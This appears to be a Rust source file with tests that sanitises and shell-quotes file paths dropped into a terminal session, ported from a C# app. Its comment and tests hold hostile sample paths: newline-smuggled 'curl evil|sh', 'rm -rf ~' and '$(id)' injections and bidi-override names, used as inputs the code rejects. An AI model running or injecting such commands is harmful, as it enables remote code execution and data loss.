//! The text a file drop inserts into a session (C# `TerminalBridge.BuildDroppedPathsPayload`).
//!
//! A dropped path is untrusted: the WPF app once wrote `file:///C:/x%0Acurl%20evil%7Csh%0A`
//! straight to the PTY, and the newline in it was Enter. So:
//!
//! - A path with a control character (C0, DEL, C1) or a Unicode format character (category Cf:
//!   bidi overrides, zero-width spaces) is **rejected**, not escaped. No real filename has one,
//!   and a path that renders as something other than what it is must not be one Enter away.
//! - Windows: a path containing `"` is rejected (no quoting is right for cmd, PowerShell and a
//!   POSIX shell at once, and Win32 forbids it anyway); one with whitespace or any shell
//!   metacharacter of cmd, PowerShell or bash is wrapped in double quotes.
//! - POSIX: one that needs it is wrapped in single quotes, an embedded `'` written `'\''`.
//! - At most [`MAX_PATHS`] paths (truncated, not refused) and each at most [`MAX_PATH_UNITS`]
//!   UTF-16 units (a longer one is skipped), joined by single spaces.
//!
//! The caller still delivers the result as a *paste* (bracketed when the program asked), never
//! as typed keys, and never adds an Enter.

use crate::program_status_payload::is_format_char;
use crate::text::utf16_len;

/// Paths inserted from one drop (C# `MaxPaths`).
pub const MAX_PATHS: usize = 64;
/// Longest path accepted, in UTF-16 code units (C# `MaxPathLength`).
pub const MAX_PATH_UNITS: usize = 1024;

/// Which shell quoting the inserted text uses.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Quoting {
    /// Double quotes, safe for cmd.exe, PowerShell and a POSIX shell for every path Windows
    /// can name (C# parity).
    Windows,
    /// Single quotes with `'\''` for an embedded quote.
    Posix,
}

impl Quoting {
    /// The quoting for the platform this build runs on.
    pub fn native() -> Quoting {
        if cfg!(windows) { Quoting::Windows } else { Quoting::Posix }
    }
}

/// Characters that make a word syntax in cmd, PowerShell or bash (the C# set: the union, since
/// the pane could be running any of them). Over-quoting is harmless in all of them.
const WINDOWS_META: &str = "&|<>^();,=!%$`'{}[]";
/// The POSIX shells' set, plus the Windows ones (a WSL or SSH shell under a Windows build is
/// still a POSIX shell, and the extra quoting costs nothing).
const POSIX_META: &str = "&|<>^();,=!%$`'{}[]\"\\*?~#";

fn rejected(path: &str) -> bool {
    path.is_empty() || utf16_len(path) > MAX_PATH_UNITS || path.chars().any(|c| c.is_control() || is_format_char(c))
}

fn needs_quoting(path: &str, meta: &str) -> bool {
    path.chars().any(|c| c.is_whitespace() || meta.contains(c))
}

/// One path as it is inserted, or `None` when it is refused.
pub fn quote_path(path: &str, quoting: Quoting) -> Option<String> {
    if rejected(path) {
        return None;
    }
    match quoting {
        Quoting::Windows => {
            if path.contains('"') {
                return None;
            }
            Some(if needs_quoting(path, WINDOWS_META) { format!("\"{path}\"") } else { path.to_owned() })
        }
        Quoting::Posix => Some(if needs_quoting(path, POSIX_META) { format!("'{}'", path.replace('\'', "'\\''")) } else { path.to_owned() }),
    }
}

/// The text to paste for a drop of `paths`: the accepted ones, quoted, space-separated. Empty
/// when nothing was acceptable (insert nothing).
pub fn build_dropped_paths_payload<S: AsRef<str>>(paths: &[S], quoting: Quoting) -> String {
    paths.iter().filter_map(|p| quote_path(p.as_ref(), quoting)).take(MAX_PATHS).collect::<Vec<_>>().join(" ")
}

#[cfg(test)]
mod tests {
    use super::*;

    fn win(paths: &[&str]) -> String {
        build_dropped_paths_payload(paths, Quoting::Windows)
    }

    fn posix(paths: &[&str]) -> String {
        build_dropped_paths_payload(paths, Quoting::Posix)
    }

    // ── Ported from the WPF DroppedPathsTests ───────────────────────────────────────────

    #[test]
    fn paths_containing_control_characters_are_dropped() {
        for hostile in ["C:\\x\ncurl evil|sh\n", "C:\\x\rwhoami\r", "C:\\x\u{0}y", "C:\\x\u{1b}]0;title\u{7}", "\n", "C:\\x\u{85}y", "C:\\x\u{7f}"] {
            assert_eq!(win(&[hostile]), "", "{hostile:?}");
            assert_eq!(posix(&[hostile]), "", "{hostile:?}");
        }
    }

    #[test]
    fn a_hostile_path_does_not_take_the_good_ones_with_it() {
        assert_eq!(win(&[r"C:\ok\one.txt", "C:\\evil\nid", r"C:\ok\two.txt"]), r"C:\ok\one.txt C:\ok\two.txt");
    }

    #[test]
    fn ordinary_paths_are_unchanged_or_quoted_for_spaces() {
        assert_eq!(win(&[r"C:\Users\alice\file.txt"]), r"C:\Users\alice\file.txt");
        assert_eq!(win(&[r"C:\Program Files\a.txt"]), "\"C:\\Program Files\\a.txt\"");
    }

    #[test]
    fn a_quote_in_a_path_is_rejected_on_windows() {
        assert_eq!(win(&["C:\\a\"b c"]), "");
        assert_eq!(win(&["x\"&calc&\".txt"]), "");
    }

    #[test]
    fn shell_metacharacters_force_quoting() {
        for p in [r"C:\tmp\a&calc.txt", r"C:\tmp\a;b.txt", r"C:\tmp\a|b.txt", r"C:\tmp\(x).txt", r"C:\tmp\a$b.txt", r"C:\tmp\a`b.txt"] {
            assert_eq!(win(&[p]), format!("\"{p}\""), "{p}");
        }
    }

    #[test]
    fn multiple_paths_are_space_separated() {
        assert_eq!(win(&[r"C:\a", r"C:\b"]), r"C:\a C:\b");
    }

    #[test]
    fn empty_input_produces_nothing_to_write() {
        assert_eq!(win(&[]), "");
        assert_eq!(win(&["", ""]), "");
    }

    #[test]
    fn bidi_and_format_characters_are_rejected() {
        // No C0/C1 character in these: they must be refused for being format characters.
        assert_eq!(win(&["C:\\tmp\\a\u{202E}cxe.txt"]), "");
        assert_eq!(win(&["C:\\tmp\\a\u{200B}b.txt"]), "");
        assert_eq!(posix(&["/tmp/a\u{2066}b"]), "");
        assert_eq!(posix(&["/tmp/a\u{E0041}b"]), "", "tag characters outside the BMP too");
    }

    #[test]
    fn the_path_list_is_bounded() {
        let many: Vec<String> = (0..500).map(|i| format!("C:\\tmp\\f{i}.txt")).collect();
        let payload = build_dropped_paths_payload(&many, Quoting::Windows);
        assert_eq!(payload.split(' ').count(), MAX_PATHS);
        assert!(payload.starts_with(r"C:\tmp\f0.txt "));
    }

    #[test]
    fn absurdly_long_paths_are_skipped() {
        let huge = format!("C:\\tmp\\{}", "x".repeat(5000));
        assert_eq!(win(&[huge.as_str()]), "");
        // The limit is in UTF-16 units, as in C#: 1024 units is fine, 1025 is not.
        let edge = format!("C:\\{}", "y".repeat(MAX_PATH_UNITS - 3));
        assert_eq!(win(&[edge.as_str()]), edge);
        let over = format!("{edge}y");
        assert_eq!(win(&[over.as_str()]), "");
    }

    // ── POSIX quoting ───────────────────────────────────────────────────────────────────

    #[test]
    fn posix_paths_are_single_quoted_when_needed() {
        assert_eq!(posix(&["/home/alice/file.txt"]), "/home/alice/file.txt");
        assert_eq!(posix(&["/home/alice/My Documents/a.txt"]), "'/home/alice/My Documents/a.txt'");
        for p in ["/tmp/a&b", "/tmp/a;b", "/tmp/$(id)", "/tmp/a`id`", "/tmp/*.txt", "/tmp/a\\b", "~/x", "/tmp/a\"b"] {
            assert_eq!(posix(&[p]), format!("'{p}'"), "{p}");
        }
    }

    #[test]
    fn a_single_quote_is_closed_escaped_and_reopened() {
        assert_eq!(posix(&["/tmp/it's here"]), r"'/tmp/it'\''s here'");
        // What a shell makes of it: the quote cannot end the quoting early.
        assert_eq!(posix(&["/tmp/'; rm -rf ~; '"]), r"'/tmp/'\''; rm -rf ~; '\'''");
    }

    #[test]
    fn a_rejected_path_does_not_count_towards_the_cap() {
        let mut v: Vec<String> = vec!["bad\npath".into(); 10];
        v.extend((0..70).map(|i| format!("/tmp/{i}")));
        let payload = build_dropped_paths_payload(&v, Quoting::Posix);
        assert_eq!(payload.split(' ').count(), MAX_PATHS);
        assert!(payload.starts_with("/tmp/0 "));
    }
}
